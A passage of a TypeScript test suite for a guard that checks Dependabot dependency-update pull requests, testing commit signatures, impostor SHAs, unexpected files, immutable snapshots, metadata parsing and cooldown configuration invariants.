  assert.equal((await prVerdict({ product: true, files: [productWorkflow] })).verdict, 'PASS')
  const unclassified = await prVerdict({ product: true, files: ['.github/workflows/other.yml'] })
  assert.deepEqual(codes(unclassified), ['OWNERSHIP_UNAVAILABLE'])
  assert.equal((await prVerdict({ files: [kitWorkflow] })).verdict, 'PASS')
  const impostor = await prVerdict({
    product: true,
    files: [kitWorkflow],
    workflowHeadSha: SHA_IMPOSTOR,
  })
  assert.deepEqual(codes(impostor), ['ACTION_IMPOSTOR', 'KIT_PATH'])
})

test('identity and policy uncertainty or transitions withhold admission', async () => {
  for (const options of [
    { product: true, policy: null },
    { product: true, policy: '{' },
    {
      product: true,
      policy:
        '{"version":1,"protected_prefixes":[],"protected_files":[],"kit_origin_allowlist":[]}',
    },
    { product: true, marker: null },
    { product: true, marker: '{' },
    { product: true, marker: '{}' },
    { marker: JSON.stringify({ upstreamCommit: 'e'.repeat(40) }) },
    { product: true, declaration: null },
    { product: true, declaration: '{' },
    { product: true, headMarker: null },
    { product: true, headDeclaration: null },
    { product: true, ownershipError: true },
    { product: true, policyReadError: true },
  ]) {
    const v = await prVerdict({ ...options, files: ['apps/product-web/package.json', 'bun.lock'] })
    assert.ok(codes(v).includes('OWNERSHIP_UNAVAILABLE'), JSON.stringify(options))
  }
})

test('nonmodified Product manifests are withheld even when rename source is unavailable', async () => {
  for (const fileStatus of ['added', 'removed', 'renamed']) {
    const v = await prVerdict({
      product: true,
      fileStatus,
      files: ['apps/product-web/package.json', 'bun.lock'],
    })
    assert.ok(codes(v).includes('UNEXPECTED_FILE'))
  }
})

test('ownership does not bypass signature, cooldown, or final snapshot checks', async () => {
  const unsigned = {
    ...dependabotCommit,
    commit: { ...dependabotCommit.commit, verification: { verified: false } },
  }
  const options = {
    product: true,
    files: ['packages/ui/package.json', 'bun.lock'],
    commits: [unsigned],
    now: NOW_YOUNG,
  }
  const v = await prVerdict(options)
  assert.deepEqual(codes(v), ['FOREIGN_COMMIT', 'KIT_PATH', 'TOO_YOUNG'])
  await assert.rejects(() => prVerdict({ ...options, laterHead: 'd'.repeat(40) }), /snapshot/)
  await assert.rejects(() => prVerdict({ ...options, laterBase: 'd'.repeat(40) }), /base ref/)
})

test('FOREIGN_COMMIT: a human push onto the Dependabot branch (RED-05) is withheld', async () => {
  const human = {
    ...dependabotCommit,
    sha: 'f'.repeat(40),
    author: { login: 'mallory' },
    committer: { login: 'mallory' },
    commit: { message: metadata(), verification: { verified: false } },
  }
  const v = await prVerdict({ commits: [human, dependabotCommit] })
  assert.deepEqual(codes(v), ['FOREIGN_COMMIT'])
  assert.match(
    v.reasons[0]?.detail as string,
    /author is mallory; committer is mallory; signature not verified/,
  )
})

test('FOREIGN_COMMIT: a PR not authored by dependabot[bot] is withheld', async () => {
  await assert.rejects(() => prVerdict({ author: 'mallory' }), /identity, author or snapshot/)
})

test('UNEXPECTED_FILE: a source file in the PR, or a PR with nothing the guard can verify', async () => {
  const src = await prVerdict({ files: ['bun.lock', 'scripts/kit/evil.ts'] })
  assert.deepEqual(codes(src), ['UNEXPECTED_FILE'])
  const none = await prVerdict({ files: ['package.json'] })
  assert.deepEqual(codes(none), ['UNEXPECTED_FILE'])
})

test('immutable snapshots reject moved head or base before evaluating either direction', async () => {
  await assert.rejects(() => prVerdict({ laterHead: 'd'.repeat(40) }), /snapshot/)
  await assert.rejects(() => prVerdict({ laterBase: 'd'.repeat(40) }), /base ref/)
  await assert.rejects(() => prVerdict({ actualHead: 'd'.repeat(40) }), /snapshot/)
  await assert.rejects(() => prVerdict({ refSha: 'd'.repeat(40) }), /base ref/)
})
test('eligible metadata and ineligible metadata both refuse a moved head in either read order', async () => {
  for (const message of [metadata(), metadata('wrangler')]) {
    await assert.rejects(() => prVerdict({ message, actualHead: 'd'.repeat(40) }), /snapshot/)
    await assert.rejects(() => prVerdict({ message, laterHead: 'd'.repeat(40) }), /snapshot/)
  }
})

test('metadata is taken from the evaluated commit, never a second PR head', async () => {
  const allowed = await prVerdict({ message: metadata('hono', 'version-update:semver-minor') })
  assert.equal(allowed.verdict, 'PASS')
  assert.deepEqual(allowed.snapshot, SNAPSHOT)
  for (const message of [
    metadata('wrangler'),
    metadata('hono', 'version-update:semver-major'),
    metadata('hono', 'unknown'),
    'no metadata',
    `${metadata().replace('...\n', '')}- dependency-name: wrangler\n  update-type: version-update:semver-minor\n...\n`,
    `${metadata().replace('...\n', '')}- dependency-name: other\n  update-type: unknown\n...\n`,
  ]) {
    const withheld = await prVerdict({ message })
    assert.equal(withheld.verdict, 'WITHHOLD')
    assert.ok(codes(withheld).includes('METADATA_UNAVAILABLE'))
  }
})

test('comparison truncation or uncertain file cap never passes', async () => {
  await assert.rejects(() => prVerdict({ compareTotal: 101 }), /incomplete comparison commits/)
  const firstPage = Array.from({ length: 100 }, (_, i) => ({
    ...dependabotCommit,
    sha: (i + 1).toString(16).padStart(40, '0'),
  }))
  await assert.rejects(
    () => prVerdict({ commits: firstPage, compareTotal: 101 }),
    /invalid immutable comparison/,
  )
  await assert.rejects(
    () => prVerdict({ files: Array.from({ length: 300 }, (_, i) => `file${i}`) }),
    /cap/,
  )
})
// ---------- configuration invariants the guard depends on ----------
test('bunfig.toml minimumReleaseAge equals every Dependabot cooldown — one age policy, no drift', async () => {
  const age = Bun.TOML.parse(readFileSync(join(ROOT, 'bunfig.toml'), 'utf8')) as {
    install?: { minimumReleaseAge?: number }
  }
  const dependabot = Bun.YAML.parse(readFileSync(join(ROOT, '.github/dependabot.yml'), 'utf8')) as {
    updates: { 'package-ecosystem': string; cooldown: { 'default-days': number } }[]
  }
  assert.ok(dependabot.updates.length >= 1)
  const identity = execFileSync('node', [join(ROOT, 'scripts/kit/resolve-tree-identity.mjs')], {
    cwd: ROOT,
    encoding: 'utf8',
    env: { ...process.env, ROOT, EXTRACT_MODE: '', EXTRACT_HARNESS_SENTINEL: '' },
  })
  assert.match(identity, /^mode=(kit|product) identity=/, 'tree identity must be explicit')
  if (identity.startsWith('mode=kit ')) {
    const ecosystems = dependabot.updates.map((u) => u['package-ecosystem'])
    assert.ok(ecosystems.includes('bun') && ecosystems.includes('github-actions'))
  }
  for (const u of dependabot.updates) {
    assert.equal(
      u.cooldown['default-days'] * DAY,
      age.install?.minimumReleaseAge,
      `${u['package-ecosystem']} cooldown vs bunfig.toml`,
    )
  }
})

test("package.json declares trustedDependencies (omitting it silently re-enables Bun's default allow list)", async () => {
  const pkg = JSON.parse(readFileSync(join(ROOT, 'package.json'), 'utf8')) as {
    trustedDependencies?: unknown
  }
  assert.ok(Array.isArray(pkg.trustedDependencies))
})

let failed = 0
for (const [name, fn] of cases) {
  try {
    await fn()
    console.log(`PASS: ${name}`)
  } catch (e) {
    failed++
    console.error(`FAIL: ${name}\n${(e as Error).stack}`)
  }
}
console.log(
  failed === 0
    ? `test-deps-guard: OK (${cases.length} cases)`
    : `test-deps-guard: ${failed}/${cases.length} FAILED`,
)
process.exit(failed === 0 ? 0 : 1)
